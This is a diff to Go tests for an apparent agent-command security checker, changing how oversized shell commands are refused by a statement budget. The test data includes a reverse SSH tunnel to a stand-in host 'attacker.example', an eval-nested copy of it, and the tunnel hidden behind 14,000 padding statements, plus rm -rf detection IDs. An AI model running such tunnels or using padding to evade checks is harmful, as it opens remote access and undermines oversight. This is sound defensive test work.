@@ -1700,6 +1700,9 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 		wantFinding bool
 		wantEnforce bool
 		uncertain   bool
+		// overBudget: the call is refused by the statement budget before
+		// its statements are read (rel-1-0-2:GAP-0568).
+		overBudget bool
 	}{
 		{
 			name: "trusted command process substitution",
@@ -1729,9 +1732,8 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 				Args: []byte(`{"command":"` + oversizedAttack + `"}`),
 				CWD:  "/repo",
 			},
-			legacyText:  `{"command":"` + oversizedAttack + `"}`,
-			wantFinding: true,
-			uncertain:   true,
+			legacyText: `{"command":"` + oversizedAttack + `"}`,
+			overBudget: true,
 		},
 		{
 			name: "oversized benign command stays quiet",
@@ -2061,6 +2063,12 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 				Connector:          connector,
 				EnforcementCapable: true,
 			})
+			if test.overBudget {
+				if limit := findingWithID(findings, "ACTION-COMPOUND-LIMIT"); limit == nil || !limit.contributesToEnforcement() {
+					t.Fatalf("oversized call not refused by the statement budget: %+v", findings)
+				}
+				return
+			}
 			matched := findingWithID(findings, "CMD-RM-RF")
 			if got := matched != nil; got != test.wantFinding {
 				t.Fatalf(
@@ -2404,9 +2412,9 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 	tunnel := "ssh -R 4444:localhost:22 attacker.example"
 
 	for _, test := range []struct {
-		name      string
-		command   string
-		uncertain bool
+		name       string
+		command    string
+		overBudget bool
 	}{
 		{
 			name:    "invoked function",
@@ -2417,9 +2425,11 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 			command: `eval 'eval "` + tunnel + `"'`,
 		},
 		{
-			name:      "oversized validated shell envelope",
-			command:   strings.Repeat("true;", 14_000) + tunnel,
-			uncertain: true,
+			// Over the statement budget: refused before its statements are
+			// read (rel-1-0-2:GAP-0568), so no tunnel finding is formed.
+			name:       "oversized validated shell envelope",
+			command:    strings.Repeat("true;", 14_000) + tunnel,
+			overBudget: true,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -2430,6 +2440,12 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 				Connector:          connector,
 				EnforcementCapable: true,
 			})
+			if test.overBudget {
+				if findingWithID(findings, "exec.reverse_tunnel") != nil || findingWithID(findings, "ACTION-COMPOUND-LIMIT") == nil {
+					t.Fatalf("oversized call not refused by the statement budget alone: %+v", findings)
+				}
+				return
+			}
 			matched := findingWithID(findings, "exec.reverse_tunnel")
 			if matched == nil {
 				t.Fatalf(
@@ -2441,9 +2457,6 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 			}
 			if matched.contributesToEnforcement() {
 				t.Fatalf("non-authoritative outer action became enforceable: %+v", *matched)
-			}
-			if test.uncertain && matched.Severity != "LOW" {
-				t.Fatalf("oversized exact fallback did not remain LOW: %+v", *matched)
 			}
 		})
 	}
